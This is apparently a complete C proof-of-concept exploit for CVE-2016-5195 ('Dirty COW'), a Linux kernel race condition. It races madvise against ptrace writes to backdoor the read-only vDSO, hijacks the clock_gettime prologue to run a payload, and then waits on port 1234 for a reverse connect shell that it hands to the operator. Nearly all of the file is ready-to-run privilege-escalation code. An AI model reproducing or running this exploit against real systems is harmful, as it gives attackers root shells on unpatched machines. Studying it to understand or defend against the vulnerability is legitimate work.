/*
 * CVE-2016-5195 POC
 * -scumjr
 */

#define _GNU_SOURCE
#include <err.h>
#include <poll.h>
#include <errno.h>
#include <sched.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <stdbool.h>
#include <sys/mman.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/prctl.h>
#include <arpa/inet.h>
#include <sys/ptrace.h>
#include <sys/socket.h>

#include "payload.h"

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

#define LOOP			0x10000
#define VDSO_SIZE		(2 * PAGE_SIZE)
#define CONNECT_BACK_PORT	1234
#define PATCH			"\xde\xad\xbe\xef\xde\xad\xbe\xef\xde\xad\xbe\xef"
#define ARRAY_SIZE(arr)		(sizeof(arr) / sizeof(arr[0]))

typedef unsigned int uint32_t;
typedef unsigned long uint64_t;

struct vdso_patch {
	unsigned char *patch;
	unsigned char *copy;
	size_t size;
	void *addr;
};

struct prologue {
	char *opcodes;
	size_t size;
};

struct mem_arg  {
	void *vdso_addr;
	bool do_patch;
	bool stop;
	unsigned int patch_number;
};

static char child_stack[8192];
static struct vdso_patch vdso_patch[2];

static struct prologue prologues[] = {
	/* push rbp; mov rbp, rsp; lfence */
	{ "\x55\x48\x89\xe5\x0f\xae\xe8", 7 },
	/* push rbp; mov rbp, rsp; push r14 */
	{ "\x55\x48\x89\xe5\x41\x57", 6 },
	/* push rbp; mov rbp, rdi; push rbx */
	{ "\x55\x48\x89\xfd\x53", 5 },
	/* push rbp; mov rbp, rsp; xchg rax, rax */
	{ "\x55\x48\x89\xe5\x66\x66\x90", 7 },
};

static int writeall(int fd, const void *buf, size_t count)
{
	const char *p;
	ssize_t i;

	p = buf;
	do {
		i = write(fd, p, count);
		if (i == 0) {
			return -1;
		} else if (i == -1) {
			if (errno == EINTR)
				continue;
			return -1;
		}
		count -= i;
		p += i;
	} while (count > 0);

	return 0;
}

static void *get_vdso_addr(void)
{
	char buf[4096], *p;
	bool found;
	FILE *fp;

	fp = fopen("/proc/self/maps", "r");
	if (fp == NULL) {
		warn("fopen(\"/proc/self/maps\")");
		return NULL;
	}

	found = false;
	while (fgets(buf, sizeof(buf), fp) != NULL) {
		if (strstr(buf, "[vdso]")) {
			found = true;
			break;
		}
	}

	fclose(fp);

	if (!found) {
		fprintf(stderr, "failed to find vdso in /proc/self/maps");
		return NULL;
	}

	p = strchr(buf, '-');
	*p = '\0';

	return (void *)strtoll(buf, NULL, 16);
}

static int ptrace_memcpy(pid_t pid, void *dest, const void *src, size_t n)
{
	const unsigned char *s;
	unsigned long value;
	unsigned char *d;

	d = dest;
	s = src;

	while (n >= sizeof(long)) {
		memcpy(&value, s, sizeof(value));
		if (ptrace(PTRACE_POKETEXT, pid, d, value) == -1) {
			warn("ptrace(PTRACE_POKETEXT)");
			return -1;
		}

		n -= sizeof(long);
		d += sizeof(long);
		s += sizeof(long);
	}

	if (n > 0) {
		d -= sizeof(long) - n;

		errno = 0;
		value = ptrace(PTRACE_PEEKTEXT, pid, d, NULL);
		if (value == -1 && errno != 0) {
			warn("ptrace(PTRACE_PEEKTEXT)");
			return -1;
		}

		memcpy((unsigned char *)&value + sizeof(value) - n, s, n);
		if (ptrace(PTRACE_POKETEXT, pid, d, value) == -1) {
			warn("ptrace(PTRACE_POKETEXT)");
			return -1;
		}
	}

	return 0;
}

static int patch_payload(struct prologue *prologue)
{
	unsigned char *p;

	p = memmem(payload, payload_len, PATCH, sizeof(PATCH)-1);
	if (p == NULL) {
		fprintf(stderr, "[-] failed to patch payload\n");
		return -1;
	}

	memset(p, '\x90', sizeof(PATCH)-1 - prologue->size);
	memcpy(p + sizeof(PATCH)-1 - prologue->size, prologue->opcodes, prologue->size);

	return 0;
}

/* make a copy of vDSO to restore it later */
static int save_orig_vdso(void)
{
	struct vdso_patch *p;
	int i;

	for (i = 0; i < ARRAY_SIZE(vdso_patch); i++) {
		p = &vdso_patch[i];
		p->copy = malloc(p->size);
		if (p->copy == NULL) {
			warn("malloc");
			return -1;
		}

		memcpy(p->copy, p->addr, p->size);
	}

	return 0;
}

static int build_vdso_patch(void *vdso_addr)
{
	uint32_t clock_gettime_offset, target;
	unsigned long clock_gettime_addr;
	struct prologue *prologue;
	unsigned char *p, *buf;
	uint64_t entry_point;
	bool patched;
	int i;

	/* e_entry */
	p = vdso_addr;
	entry_point = *(uint64_t *)(p + 0x18);
	clock_gettime_offset = (uint32_t)entry_point & 0xfff;
	clock_gettime_addr = (unsigned long)vdso_addr + clock_gettime_offset;

	/* patch payload with appropriate prologue */
	patched = false;
	for (i = 0; i < ARRAY_SIZE(prologues); i++) {
		prologue = &prologues[i];
		if (memcmp((void *)clock_gettime_addr, prologue->opcodes, prologue->size) == 0) {
			if (patch_payload(prologue) == -1)
				return -1;
			patched = true;
			break;
		}
	}

	if (!patched) {
		fprintf(stderr, "[-] this vDSO version isn't supported\n");
		fprintf(stderr, "    add first entry point instructions to prologues\n");
		return -1;
	}

	/* patch #1: put payload at the end of vdso */
	vdso_patch[0].patch = payload;
	vdso_patch[0].size = payload_len;
	vdso_patch[0].addr = (unsigned char *)vdso_addr + VDSO_SIZE - payload_len;

	p = vdso_patch[0].addr;
	for (i = 0; i < payload_len; i++) {
		if (p[i] != '\x00') {
			fprintf(stderr, "failed to find a place for the payload\n");
			return -1;
		}
	}

	/* patch #2: hijack clock_gettime prologue */
	buf = malloc(sizeof(PATCH)-1);
	if (buf == NULL) {
		warn("malloc");
		return -1;
	}

	/* craft call to payload */
	target = VDSO_SIZE - payload_len - clock_gettime_offset;
	memset(buf, '\x90', sizeof(PATCH)-1);
	buf[0] = '\xe8';
	*(uint32_t *)&buf[1] = target - 5;

	vdso_patch[1].patch = buf;
	vdso_patch[1].size = prologue->size;
	vdso_patch[1].addr = (unsigned char *)clock_gettime_addr;

	save_orig_vdso();

	return 0;
}

static int backdoor_vdso(pid_t pid, unsigned int patch_number)
{
	struct vdso_patch *p;

	p = &vdso_patch[patch_number];
	return ptrace_memcpy(pid, p->addr, p->patch, p->size);
}

static int restore_vdso(pid_t pid, unsigned int patch_number)
{
	struct vdso_patch *p;

	p = &vdso_patch[patch_number];
	return ptrace_memcpy(pid, p->addr, p->copy, p->size);
}

/*
 * Check if vDSO is entirely patched. This function is executed in a different
 * memory space because of fork(). The parent is notified thanks to the pipe.
 */
static int check(struct mem_arg *arg, int pipe)
{
	struct vdso_patch *p;
	void *src;
	char c;
	int i;

	p = &vdso_patch[arg->patch_number];
	src = arg->do_patch ? p->patch : p->copy;

	for (i = 0; i < LOOP; i++) {
		if (memcmp(p->addr, src, p->size) == 0) {
			c = '!';
			if (writeall(pipe, &c, sizeof(c)) == -1)
				return -1;
			return 0;
		}

		usleep(100);
	}

	return 1;
}

static void *madviseThread(void *arg_)
{
	struct mem_arg *arg;

	arg = (struct mem_arg *)arg_;
	while (!arg->stop) {
		if (madvise(arg->vdso_addr, VDSO_SIZE, MADV_DONTNEED) == -1) {
			warn("madvise");
			break;
		}
	}

	return NULL;
}

static int debuggee(void *arg_)
{
	if (prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0) == -1)
		err(1, "prctl(PR_SET_PDEATHSIG)");

	if (ptrace(PTRACE_TRACEME, 0, NULL, NULL) == -1)
		err(1, "ptrace(PTRACE_TRACEME)");

	kill(getpid(), SIGSTOP);

	return 0;
}

/* use ptrace to write to read-only mappings */
static void *ptrace_thread(void *arg_)
{
	int flags, ret2, status;
	struct mem_arg *arg;
	pid_t pid;
	void *ret;

	arg = (struct mem_arg *)arg_;

	flags = CLONE_VM|CLONE_PTRACE;
	pid = clone(debuggee, child_stack + sizeof(child_stack) - 8, flags, arg);
	if (pid == -1) {
		warn("clone");
		return NULL;
	}

	if (waitpid(pid, &status, __WALL) == -1) {
		warn("waitpid");
		return NULL;
	}

	ret = NULL;
	while (!arg->stop) {
		if (arg->do_patch)
			ret2 = backdoor_vdso(pid, arg->patch_number);
		else
			ret2 = restore_vdso(pid, arg->patch_number);

		if (ret2 == -1) {
			ret = NULL;
			break;
		}
	}

	if (ptrace(PTRACE_CONT, pid, NULL, NULL) == -1)
		warn("ptrace(PTRACE_CONT)");

	if (waitpid(pid, NULL, __WALL) == -1)
		warn("waitpid");

	return ret;
}

static int exploit_helper(struct mem_arg *arg)
{
	pthread_t pth1, pth2;
	pid_t pid;
	int fd[2];
	int ret;
	char c;

	fprintf(stderr, "[*] %s: patch %d/%ld\n",
		arg->do_patch ? "exploit" : "restore",
		arg->patch_number + 1,
		ARRAY_SIZE(vdso_patch));

	if (pipe(fd) == -1) {
		warn("pipe");
		return -1;
	}

	/* run "check" in a different memory space */
	pid = fork();
	if (pid == -1) {
		warn("fork");
		close(fd[0]);
		close(fd[1]);
		return -1;
	} else if (pid == 0) {
		close(fd[0]);
		ret = check(arg, fd[1]);
		close(fd[1]);
		exit(ret);
	}

	close(fd[1]);

	arg->stop = false;
	pthread_create(&pth1, NULL, madviseThread, arg);
	pthread_create(&pth2, NULL, ptrace_thread, arg);

	/* wait for "check" process */
	if (waitpid(pid, NULL, 0) == -1) {
		warn("waitpid");
		close(fd[0]);
		return -1;
	}

	/* tell the 2 threads to stop and wait for them */
	arg->stop = true;
	pthread_join(pth1, NULL);
	pthread_join(pth2, NULL);

	/* check result */
	if (read(fd[0], &c, sizeof(c)) == sizeof(c)) {
		fprintf(stderr, "[*] vdso successfully %s\n",
			arg->do_patch ? "backdoored" : "restored");
		ret = 0;
	} else {
		fprintf(stderr, "[-] failed to win race condition...\n");
		ret = -1;
	}

	close(fd[0]);

	return ret;
}

/*
 * Apply vDSO patches in the correct order.
 *
 * During the backdoor step, the payload must be written before hijacking the
 * function prologue. During the restore step, the prologue must be restored
 * before removing the payload.
 */
static int exploit(struct mem_arg *arg, bool do_patch)
{
	unsigned int i;
	int ret;

	ret = 0;
	arg->do_patch = do_patch;

	for (i = 0; i < ARRAY_SIZE(vdso_patch); i++) {
		if (do_patch)
			arg->patch_number = i;
		else
			arg->patch_number = ARRAY_SIZE(vdso_patch) - i - 1;

		if (exploit_helper(arg) == -1) {
			ret = -1;
			break;
		}
	}

	return ret;
}

static int create_socket(void)
{
	struct sockaddr_in addr;
	int enable, s;

	s = socket(AF_INET, SOCK_STREAM, 0);
	if (s == -1) {
		warn("socket");
		return -1;
	}

	enable = 1;
	if (setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &enable, sizeof(enable)) == -1)
		warn("setsockopt(SO_REUSEADDR)");

	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = INADDR_ANY;
	addr.sin_port = htons(CONNECT_BACK_PORT);

	if (bind(s, (struct sockaddr *) &addr, sizeof(addr)) == -1) {
		warn("failed to bind socket on port %d", CONNECT_BACK_PORT);
		close(s);
		return -1;
	}

	if (listen(s, 1) == -1) {
		warn("listen");
		close(s);
		return -1;
	}

	return s;
}

/* interact with reverse connect shell */
static int yeah(struct mem_arg *arg, int s)
{
	struct sockaddr_in addr;
	struct pollfd fds[2];
	socklen_t addr_len;
	char buf[4096];
	nfds_t nfds;
	int c, n;

	fprintf(stderr, "[*] waiting for reverse connect shell...\n");

	addr_len = sizeof(addr);
	while (1) {
		c = accept(s, (struct sockaddr *)&addr,	&addr_len);
		if (c == -1) {
			if (errno == EINTR)
				continue;
			warn("accept");
			return -1;
		}
		break;
	}

	close(s);

	fprintf(stderr, "[*] enjoy!\n");

	if (fork() == 0) {
		if (exploit(arg, false) == -1)
			fprintf(stderr, "[-] failed to restore vDSO\n");
		exit(0);
	}

	fds[0].fd = STDIN_FILENO;
	fds[0].events = POLLIN;

	fds[1].fd = c;
	fds[1].events = POLLIN;

	nfds = 2;
	while (nfds > 0) {
		if (poll(fds, nfds, -1) == -1) {
			if (errno == EINTR)
				continue;
			warn("poll");
			break;
		}

		if (fds[0].revents == POLLIN) {
			n = read(STDIN_FILENO, buf, sizeof(buf));
			if (n == -1) {
				if (errno != EINTR) {
					warn("read(STDIN_FILENO)");
					break;
				}
			} else if (n == 0) {
				break;
			} else {
				writeall(c, buf, n);
			}
		}

		if (fds[1].revents == POLLIN) {
			n = read(c, buf, sizeof(buf));
			if (n == -1) {
				if (errno != EINTR) {
					warn("read(c)");
					break;
				}
			} else if (n == 0) {
				break;
			} else {
				writeall(STDOUT_FILENO, buf, n);
			}
		}
	}

	return 0;
}

int main(void)
{
	struct mem_arg arg;
	int s;

	arg.vdso_addr = get_vdso_addr();
	if (arg.vdso_addr == NULL)
		return EXIT_FAILURE;

	if (build_vdso_patch(arg.vdso_addr) == -1)
		return EXIT_FAILURE;

	s = create_socket();
	if (s == -1)
		return EXIT_FAILURE;

	if (exploit(&arg, true) == -1) {
		fprintf(stderr, "exploit failed\n");
		return EXIT_FAILURE;
	}

	yeah(&arg, s);

	return EXIT_SUCCESS;
}
